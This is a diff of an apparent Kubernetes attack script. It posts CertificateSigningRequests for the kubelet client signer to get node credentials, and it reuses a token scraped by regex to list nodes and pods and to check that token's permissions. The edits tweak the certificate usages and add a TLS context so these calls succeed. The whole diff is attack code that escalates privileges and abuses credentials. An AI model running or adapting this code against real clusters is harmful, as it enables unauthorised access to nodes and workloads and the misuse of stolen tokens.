@@ -165,7 +165,7 @@ def api():
         cbody = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
                             "metadata": {"name": cname},
                             "spec": {"request": csr, "signerName": "kubernetes.io/kube-apiserver-client-kubelet",
-                                     "usages": ["digital signature", "client auth"]}}).encode()
+                                     "usages": ["digital signature", "key encipherment", "client auth"]}}).encode()
         st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests", "POST", cbody)
         out("CSR create status=%s %s" % (st, b[:400].decode("utf8", "replace")))
         cert = None
@@ -315,11 +315,11 @@ def api4():
     kpt = msk.group(1).encode() if msk else None
     if kpt:
         kpt = kpt.decode("latin1").strip()
-        st, b = call("/api/v1/nodes", auth=kpt)
+        st, b = call("/api/v1/nodes", ctx=ctx0, auth=kpt)
         out("PROXYTOKEN nodes status=%s len=%d %s" % (st, len(b), b[:200].decode("utf8", "replace")))
-        st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body, auth=kpt)
+        st, b = call("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", body, ctx=ctx0, auth=kpt)
         out("PROXYTOKEN SSRR status=%s\n%s" % (st, b[:3000].decode("utf8", "replace")))
-        st, b = call("/api/v1/pods?limit=5", auth=kpt)
+        st, b = call("/api/v1/pods?limit=5", ctx=ctx0, auth=kpt)
         out("PROXYTOKEN pods status=%s %s" % (st, b[:300].decode("utf8", "replace")))
 
     # CSR + nodeclient subresource variants
@@ -330,7 +330,7 @@ def api4():
     cbody = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
                         "metadata": {"name": cname},
                         "spec": {"request": csr, "signerName": "kubernetes.io/kube-apiserver-client-kubelet",
-                                 "usages": ["digital signature", "client auth"]}}).encode()
+                                 "usages": ["digital signature", "key encipherment", "client auth"]}}).encode()
     st, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests", "POST", cbody)
     out("CSR create status=%s %s" % (st, b[:250].decode("utf8", "replace")))
     if st in (200, 201):
